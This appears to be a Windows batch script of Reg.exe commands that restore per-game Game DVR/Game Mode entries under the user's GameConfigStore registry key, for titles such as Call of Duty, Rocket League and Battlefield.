Reg.exe add "HKCU\System\GameConfigStore\Children\6053cdf7-6d52-42c8-9967-a29a542b7ae1" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000e2726d36d4db62316e89dbe86d0713afa3786f7481cb30074fa4a5fedce70db8000000000e80000000020000200000007410aa4e3b3943aada0f15ae6c18cce178c0f4b905c7d6ee777862bb77939e4d20000000265f6b0bf596dbb210c33de536bc88960c1cbb7cd5a6bfbd8693dd003f1279d54000000090c43e7cdeff564ea053c0a90455b62d5fd956bd105b1e40b7d7bf0e029c0e2c502cbb5045f2afea909d2dd6708137497d0e9439423ebca735f77327dd5106e8" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\6053cdf7-6d52-42c8-9967-a29a542b7ae1" /v "GameDVR_GameGUID" /t REG_SZ /d "a78ce068-6b2c-4b51-9305-229303a1512a" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\6053cdf7-6d52-42c8-9967-a29a542b7ae1" /v "TitleId" /t REG_SZ /d "1644611974" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\70c3139d-9c99-4038-ad15-1d6bf312fb15" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\70c3139d-9c99-4038-ad15-1d6bf312fb15" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\70c3139d-9c99-4038-ad15-1d6bf312fb15" /v "Flags" /t REG_DWORD /d "17" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\70c3139d-9c99-4038-ad15-1d6bf312fb15" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa1040000000200000000001066000000010000200000009adcd8abd6338e2412ed2f5dc0b1842da1972b40ea9b4a512e31815085161068000000000e8000000002000020000000aaff27b059cf8a88ba4b0fa5a41c2095712151da880d633aac62e64f99ce5575300000004617b59d8bd8bcba1c6692500f6747547d5898702df8c9ffe31031b58b36161948484ea47bd82b793bd4f9f512036fc3400000003a13b89f787d72a9237c6e6f2097b9450a2e64a05a95e17e760b422ab542e9fd0a5be313634d5d0289b3e4c751cb859c1ae6f274c7dd66743f7de9a552eba890" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\70c3139d-9c99-4038-ad15-1d6bf312fb15" /v "GameDVR_GameGUID" /t REG_SZ /d "6b15dfa7-66e4-4a62-a748-05cb4dadf867" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\70c3139d-9c99-4038-ad15-1d6bf312fb15" /v "TitleId" /t REG_SZ /d "1787008472" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\70c3139d-9c99-4038-ad15-1d6bf312fb15" /v "MatchedExeFullPath" /t REG_SZ /d "E:\COD WarZone\Call of Duty Modern Warfare\ModernWarfare.exe" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\70df813c-6159-4d82-b679-3b79c7aa6cb1" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\70df813c-6159-4d82-b679-3b79c7aa6cb1" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\70df813c-6159-4d82-b679-3b79c7aa6cb1" /v "Flags" /t REG_DWORD /d "561" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\70df813c-6159-4d82-b679-3b79c7aa6cb1" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000cca38c1d965f79d722805958e9d94a1f2c0b08db017c48281a12d2ec3de4499b000000000e800000000200002000000001e7427de70ec70c3544165a4a42a9adb6e8faa81d703df1ef680b9f99f4b1c110000000fea1a4d63f604f88f18c201082f75cdd40000000fa49fd7ec1eed8294f5696f3769851210c965cb01b149a31a537954ca8a233b97c139955ab66bc39f75a6809bea68da89b686479be9c812d3f13896eaed19ea7" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\70df813c-6159-4d82-b679-3b79c7aa6cb1" /v "ExeParentDirectory" /t REG_SZ /d "Red Faction Guerrilla" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\70df813c-6159-4d82-b679-3b79c7aa6cb1" /v "GameDVR_GameGUID" /t REG_SZ /d "3e70fc1f-7916-4016-ac8e-b59dddbff6e9" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\70df813c-6159-4d82-b679-3b79c7aa6cb1" /v "TitleId" /t REG_SZ /d "1995066354" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\73400fc2-5ae9-4532-86dd-29d81bae1132" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\73400fc2-5ae9-4532-86dd-29d81bae1132" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\73400fc2-5ae9-4532-86dd-29d81bae1132" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\73400fc2-5ae9-4532-86dd-29d81bae1132" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000d4b1cfac322a9636b898bc9e9398d9270a706113a520ff21ec3092ce51b94887000000000e80000000020000200000000ba3723336a0a15c0891602834cccfd9910edb9f23a5b2ff1d2a37daad82346830000000a9f46ad7e999c29ce0faf59d1d1e093e0aae5500a71d56afa61d246d994d1a8f79fb94d7d8bc734bfe13f69805bb96d4400000008fe6d531cce3a3fde7b96b330b7fa7b83a53250a667eff07c596f10822b0d9c04cb192d6fe1c9aae1f88a5e9352c8b76277e1225c94d7d5fa23a21883a064408" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\73400fc2-5ae9-4532-86dd-29d81bae1132" /v "GameDVR_GameGUID" /t REG_SZ /d "ba8cb5ec-5912-4170-87bb-ba98605e8318" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\73400fc2-5ae9-4532-86dd-29d81bae1132" /v "TitleId" /t REG_SZ /d "1956642556" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\73400fc2-5ae9-4532-86dd-29d81bae1132" /v "ProcessDependencies" /t REG_MULTI_SZ /d "audiodg.exe|1\0battle.net.exe|8\0battle.net helper.exe|8" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\77b4d6e3-85d7-4ae9-ad9b-52b42f98077f" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\77b4d6e3-85d7-4ae9-ad9b-52b42f98077f" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\77b4d6e3-85d7-4ae9-ad9b-52b42f98077f" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\77b4d6e3-85d7-4ae9-ad9b-52b42f98077f" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000e365c2dedb7aa80048139c2753ce5d733891e7f8889929eb77405da34b074648000000000e80000000020000200000003d5423fc55c3891e0af498bd039d6375ac49c426c3efae537ef3563ad095593c300000002092d1969ed4ccc6e608e28cf1035996ca841bed9f88d7850223f8b236f33384735db185fa7d9d868739c17b8e53b9c840000000cac55fa6eecbc31b2d0ac5772ee8782050f6027a080415825084c0cc0724db1f5513b81ed0f22cd0104f8890556bb6422ca9795601609aae5dc7beaa5aa6a735" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\77b4d6e3-85d7-4ae9-ad9b-52b42f98077f" /v "GameDVR_GameGUID" /t REG_SZ /d "53080e08-49fb-4312-9e1f-8fc378ea09a1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\77b4d6e3-85d7-4ae9-ad9b-52b42f98077f" /v "TitleId" /t REG_SZ /d "2089711717" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\7c6c29ed-6638-4b39-87c9-90749f34fd0f" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\7c6c29ed-6638-4b39-87c9-90749f34fd0f" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\7c6c29ed-6638-4b39-87c9-90749f34fd0f" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\7c6c29ed-6638-4b39-87c9-90749f34fd0f" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000b084d437973df586eefe73f040fa43348ec64eb5942639faeb12943ea9c8ce1f000000000e80000000020000200000006ad79d8212289819d5094a3426dc46b71f34cd4d6f262ec924af385b20b9dd6f2000000028fa4cb3ea12414e2b8b842a287b8f1f0d1ae23fc0b0caa0f9d2c248ad60facf4000000058c2cce7d4c0b4a28746e13fd765598b0cddae1b8b869a2170c744210a65016e5292920088979defdb6de4b2d2ebeace65750139b89e9f66fba8b743b46cc5d2" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\7c6c29ed-6638-4b39-87c9-90749f34fd0f" /v "GameDVR_GameGUID" /t REG_SZ /d "c9a828a1-eacc-46a4-9372-6a5c7dd052ae" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\7c6c29ed-6638-4b39-87c9-90749f34fd0f" /v "TitleId" /t REG_SZ /d "1862446374" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\7c6c29ed-6638-4b39-87c9-90749f34fd0f" /v "MatchedExeFullPath" /t REG_SZ /d "C:\Users\pc\AppData\Local\FiveM\FiveM.exe" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\88bba3e3-6149-435f-8f03-2e763a6b28e5" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\88bba3e3-6149-435f-8f03-2e763a6b28e5" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\88bba3e3-6149-435f-8f03-2e763a6b28e5" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\88bba3e3-6149-435f-8f03-2e763a6b28e5" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000bbf0b749457861b6011e095a8abd591acc8169e950dbefda3f14b3a4a2d8fbc9000000000e8000000002000020000000ba63f57d769a7e565aea5c810b851c1bcb4b339eaf33eba8dc112744e2caf6cb10000000e5b4febbae83767b9197f4000cd4ceb740000000fc6bcc008bb511c3b79d17b7d0c5d17f546e7e1ca7e686897fd26c198fefd590b807d62da43436ad1b1bd1fbed980259c43c33d677df1153c87decc292062371" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\88bba3e3-6149-435f-8f03-2e763a6b28e5" /v "ExeParentDirectory" /t REG_SZ /d "Football Manager 2018" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\88bba3e3-6149-435f-8f03-2e763a6b28e5" /v "GameDVR_GameGUID" /t REG_SZ /d "df224822-4e38-4db8-b348-1a74168570ea" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\88bba3e3-6149-435f-8f03-2e763a6b28e5" /v "TitleId" /t REG_SZ /d "1621910926" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\89012e6d-35ec-4578-bdbd-1e9c2f91d561" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\89012e6d-35ec-4578-bdbd-1e9c2f91d561" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\89012e6d-35ec-4578-bdbd-1e9c2f91d561" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\89012e6d-35ec-4578-bdbd-1e9c2f91d561" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa1040000000200000000001066000000010000200000008dcf91b9fed0dfb94f7625e598fb50dfc4711ff0a3f88afeba93d7d3a39af24f000000000e8000000002000020000000eb7c77b4f86942115f5557af80713f1d14e264e8ed648198bb9c3d99e78f07fa2000000062ec9094d0f54153a685bd257bdbbc84cc3f680712c1c26af7f776609ec25c634000000044f25d942d424f375984751d2e7ab9972c94ae3495c91ac0c6273223fee0e990538c1737ffe74496b291262aac9998dbfa6c7b163cba43005424e6766cc86181" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\89012e6d-35ec-4578-bdbd-1e9c2f91d561" /v "GameDVR_GameGUID" /t REG_SZ /d "2642baeb-a830-4329-b111-6be504a93e9a" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\89012e6d-35ec-4578-bdbd-1e9c2f91d561" /v "TitleId" /t REG_SZ /d "1698925306" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\8d4cda1b-ff25-4b90-b9eb-212e1939db2c" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\8d4cda1b-ff25-4b90-b9eb-212e1939db2c" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\8d4cda1b-ff25-4b90-b9eb-212e1939db2c" /v "Flags" /t REG_DWORD /d "17" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\8d4cda1b-ff25-4b90-b9eb-212e1939db2c" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa10400000002000000000010660000000100002000000066701ad24efda278c278975fc2b7c1a609acdf0703b6bd9b71ebeca63e733d6b000000000e80000000020000200000007039383d4a30349739c461740ab70c4482417b3d6e78999456a4d62ecd3387633000000067b1630b78ea9fe47b87c4a411023ef3da2300ce49044d7c777ca9f74c8ac788a7719582706c766b64b169b8a7c5e890400000007511e6fc8bdc3d13a7651b07f557df16b6e9ea86cae38325b17b4b89b0de0a025e11cc81d834e9b8d3917b2b554561311f4bd4651ef5a080bf440d7b0046822c" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\8d4cda1b-ff25-4b90-b9eb-212e1939db2c" /v "GameDVR_GameGUID" /t REG_SZ /d "6834708e-ff37-4f47-8d9e-e009475696ea" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\8d4cda1b-ff25-4b90-b9eb-212e1939db2c" /v "TitleId" /t REG_SZ /d "2140933132" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\8d4cda1b-ff25-4b90-b9eb-212e1939db2c" /v "MatchedExeFullPath" /t REG_SZ /d "E:\Rocket League\rocketleague\Binaries\Win64\RocketLeague.exe" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\9253f3de-1abd-412c-8fca-25196b323e44" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\9253f3de-1abd-412c-8fca-25196b323e44" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\9253f3de-1abd-412c-8fca-25196b323e44" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\9253f3de-1abd-412c-8fca-25196b323e44" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa1040000000200000000001066000000010000200000007731527d66e83e8ce4772a45b0f80db134f628fbf59f3e92f6728d2ffeaad311000000000e80000000020000200000001a88e6857edeadcc9ac396dc47b4010d64b1a19b8003b744409c2ab631ecace520000000662454a6d9bcd23b3131345a02b23b84719200419b89f85e44b71c513909557d40000000e1a2e6ceba037348ac0a8fbe848721125cc4a7350467c907e834b6d0592fe71495f789e2de3886dbc5a964ee5fc6e15fe41258bdb691642f3ca898a06979a012" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\9253f3de-1abd-412c-8fca-25196b323e44" /v "GameDVR_GameGUID" /t REG_SZ /d "36807058-7c11-4844-84fc-55062cd44bce" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\9253f3de-1abd-412c-8fca-25196b323e44" /v "TitleId" /t REG_SZ /d "2013577527" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\9b9b54e1-b0b2-42f8-b46a-63386dd30005" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\9b9b54e1-b0b2-42f8-b46a-63386dd30005" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\9b9b54e1-b0b2-42f8-b46a-63386dd30005" /v "Flags" /t REG_DWORD /d "561" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\9b9b54e1-b0b2-42f8-b46a-63386dd30005" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa1040000000200000000001066000000010000200000001f57452de10d59a26408febc40944ac03248e2031d169efcbf5dce9697886d20000000000e800000000200002000000053bf69c14de9e1e9daf7cacacf428ba3de3c3355c0fff92571c57bc17cf45ef41000000063573dd0d4eda7a4ae2c81b8089dcd22400000002dbf6ddd729210604faa0c366a760644be4a2a608d59a1b76b68fabdede6f9440d2c27c7eaeb3b79cdcd5f8693c101cd56de767b0320a3b341ee3e4519fc5b47" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\9b9b54e1-b0b2-42f8-b46a-63386dd30005" /v "ExeParentDirectory" /t REG_SZ /d "Trails of Cold Steel" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\9b9b54e1-b0b2-42f8-b46a-63386dd30005" /v "GameDVR_GameGUID" /t REG_SZ /d "4b2e0e33-943e-4010-86ff-35270e2b0d83" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\9d41f6f1-5618-4606-a8ec-1100921065fc" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\9d41f6f1-5618-4606-a8ec-1100921065fc" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\9d41f6f1-5618-4606-a8ec-1100921065fc" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\9d41f6f1-5618-4606-a8ec-1100921065fc" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000d646212c2fb6aee789f011b02cea457aecc48847cf2149d45285f412948b865f000000000e80000000020000200000008e76e6790a5171e8c0158b3b5110c564f2cdcff8faba3e9953aab1b32771c4ab20000000345216961b7d9833cfe72134363133365b9ab299c46fae335e980d687542e4694000000026f93730969dd9f952e4ed68853bcdfdc665e1366fffd4fa6cd1f70e85b7d1faf4fb900755c2647b4ff5940856f2ee9697fb81d730b69075c8dbf67d0c46e6b1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\9d41f6f1-5618-4606-a8ec-1100921065fc" /v "GameDVR_GameGUID" /t REG_SZ /d "d74e41c9-9b22-41e5-a4b8-4e303df73d38" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\9d41f6f1-5618-4606-a8ec-1100921065fc" /v "TitleId" /t REG_SZ /d "2014204696" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\9d41f6f1-5618-4606-a8ec-1100921065fc" /v "ProcessDependencies" /t REG_MULTI_SZ /d "audiodg.exe|1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\9fc09f67-272f-43f3-8c0b-2557f99f08fd" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\9fc09f67-272f-43f3-8c0b-2557f99f08fd" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\9fc09f67-272f-43f3-8c0b-2557f99f08fd" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\9fc09f67-272f-43f3-8c0b-2557f99f08fd" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000e33b7d4c792b9a6a8091a87df1d3b9e143d2fb2fdff06e631f8df6c6b5bed888000000000e800000000200002000000061671ae83bf38feaa888ae7bd30743189d64779f3996bcdb7f0f507d3e74c07d20000000aedf7ca4d131254dc118928153fadb9bcf0866fb49c440ba768f4380f24f359a4000000082e884d4315fedf90bbcb8a3c5b12a56b51b56b8eb7d90f2014d099fe1d9118bb12b310f1759449f2a49173f12d7788ccac2e6ddaa7dbf32d1d32de8e6195132" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\9fc09f67-272f-43f3-8c0b-2557f99f08fd" /v "GameDVR_GameGUID" /t REG_SZ /d "5005d987-b8aa-4be5-bafe-e4db5fba423c" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\9fc09f67-272f-43f3-8c0b-2557f99f08fd" /v "TitleId" /t REG_SZ /d "2067772105" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\a15993e5-3e93-4968-a526-b96ec64f3995" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\a15993e5-3e93-4968-a526-b96ec64f3995" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\a15993e5-3e93-4968-a526-b96ec64f3995" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\a15993e5-3e93-4968-a526-b96ec64f3995" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa1040000000200000000001066000000010000200000007c56f4d4bafe584788715db4bf16c8e21a635bbffc0ca9234952588ea0765f3e000000000e8000000002000020000000fd744903837f6fc468aa95914ce702e99e049a087a02dc9787a372c5c734b42310000000a4962be99c640172c3a45e114b804bb7400000009f2dc32db90e785aa81b9ed230c431b8fd6f120fc737a2d5b7db7aec5e95cb67fc6876c0b0673358983caa3739470f0442765adb79990c08c41cea70a4b41850" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\a15993e5-3e93-4968-a526-b96ec64f3995" /v "ExeParentDirectory" /t REG_SZ /d "Battlefield" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\a15993e5-3e93-4968-a526-b96ec64f3995" /v "GameDVR_GameGUID" /t REG_SZ /d "f6c9159e-723f-42e0-bbcd-e00f7c4ea056" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\a15993e5-3e93-4968-a526-b96ec64f3995" /v "TitleId" /t REG_SZ /d "2040962988" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\a987fbc1-fde0-406f-a039-922a6104ad2f" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\a987fbc1-fde0-406f-a039-922a6104ad2f" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\a987fbc1-fde0-406f-a039-922a6104ad2f" /v "Flags" /t REG_DWORD /d "561" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\a987fbc1-fde0-406f-a039-922a6104ad2f" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa10400000002000000000010660000000100002000000000ff626215e0be642554329f5ac104cbc1a68be2af9569c581a04f2d91ba8e70000000000e8000000002000020000000c168a6e465c299ea886c43f1a5c1355e0f29baa560ce8973a7f05283a2836493100000001f69ef04cd805342f6afa4018f0270f240000000f04369d1b25402d7cc1d1cda98768ac6bcef4d371aaa1ea119b372510ed3272fedf2fa8ec33a66d122cb700bb1626b0756996354fa85b224631b838f7f97269f" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\a987fbc1-fde0-406f-a039-922a6104ad2f" /v "ExeParentDirectory" /t REG_SZ /d "assettocorsa" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\a987fbc1-fde0-406f-a039-922a6104ad2f" /v "GameDVR_GameGUID" /t REG_SZ /d "b2683437-ff17-488a-ade2-5a8d743633a0" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\a987fbc1-fde0-406f-a039-922a6104ad2f" /v "TitleId" /t REG_SZ /d "1732322725" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\ae876636-f272-4eb2-aaa6-a110af0bd907" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\ae876636-f272-4eb2-aaa6-a110af0bd907" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\ae876636-f272-4eb2-aaa6-a110af0bd907" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\ae876636-f272-4eb2-aaa6-a110af0bd907" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000a5374cc32aad79527df1bdd6a6ed5a2b7818a394234daa9acc54e9c82b17b7a1000000000e8000000002000020000000f0c5dc3ebc33a37c33897bc28ac8f9224edecfef93091307cd3e1e9942ac640530000000272dc3dec90ef356793a14dd5525c0e71f9d165709d7ba9c690ced1b034da1b5b885ab519e3c5cd1ad06ae6cee2ff90640000000ddb4d48d1cbc562378b478595c431989e61ec83e85b421bb23355accf761d4f6d0384260c0dc9ca9307833b8aec83c2c4f7e8b4d5b30ba685d094cfcd9daf5f6" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\ae876636-f272-4eb2-aaa6-a110af0bd907" /v "GameDVR_GameGUID" /t REG_SZ /d "bfb4b9a9-febb-4fb7-9f83-2e4fed403916" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\ae876636-f272-4eb2-aaa6-a110af0bd907" /v "TitleId" /t REG_SZ /d "2036175044" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\b184ff46-9cdc-4e94-b598-5e5db72274a2" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\b184ff46-9cdc-4e94-b598-5e5db72274a2" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\b184ff46-9cdc-4e94-b598-5e5db72274a2" /v "Flags" /t REG_DWORD /d "17" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\b184ff46-9cdc-4e94-b598-5e5db72274a2" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000161cbdadf5d39450a0bee3befc2ed95e044e5061bf848526f1914309c778864a000000000e80000000020000200000005ebb58bf54fb4ada2c3aa46c46b978f4541630b51534d47dc5056ca0ce632ad12000000030e09ada059a21b2b662ed7b2f5ff2a112efdba2bcad99f5ab874a3b72281702400000000a46f4881f10972bbaec181f40769a35caa0690525eb6a3fdd3392a267975c27c134e653cd162e4352d71081f2e975a4d191dbbbefe88b62b1d6446f7cbf0398" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\b184ff46-9cdc-4e94-b598-5e5db72274a2" /v "GameDVR_GameGUID" /t REG_SZ /d "362c3b38-93be-4fb5-a043-2d32d134d003" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\b184ff46-9cdc-4e94-b598-5e5db72274a2" /v "TitleId" /t REG_SZ /d "1904011994" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\b184ff46-9cdc-4e94-b598-5e5db72274a2" /v "MatchedExeFullPath" /t REG_SZ /d "E:\Prototype-2-Radnet-Edition-Repack-Games.com\Prototype 2 - Radnet Edition\prototype2.exe" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\b1e0341d-a9d2-402c-a242-90ae9b02723c" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\b1e0341d-a9d2-402c-a242-90ae9b02723c" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\b1e0341d-a9d2-402c-a242-90ae9b02723c" /v "Flags" /t REG_DWORD /d "17" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\b1e0341d-a9d2-402c-a242-90ae9b02723c" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000852a4c80b5c2d4cdd14afa9c70884a1e966cc3bdc0eb507cb554423a135f9011000000000e8000000002000020000000b6625f0d49036c8449e70cbfd86e2442a45a88796b7acecc0fbc6b26069fb76540000000ab2666f1466dd49612a345fe39551b912c93aab16dbd30a5c9731cb026b29625f235039625f940c5ee9ff76f35ff60aa41853b90cf45de98d8b56780b8ed2e36400000005afcb0a69f82cf57da5268a5b93c8d2cf51e1d9142f8c568f86c418cf70508378a7bbd48138521c87e57b0288207f92f9385418e24325185d132c7ba6dcb7e40" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\b1e0341d-a9d2-402c-a242-90ae9b02723c" /v "GameDVR_GameGUID" /t REG_SZ /d "4380af58-6d39-48e0-845c-c246ca123fb7" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\b1e0341d-a9d2-402c-a242-90ae9b02723c" /v "TitleId" /t REG_SZ /d "1901314766" /f
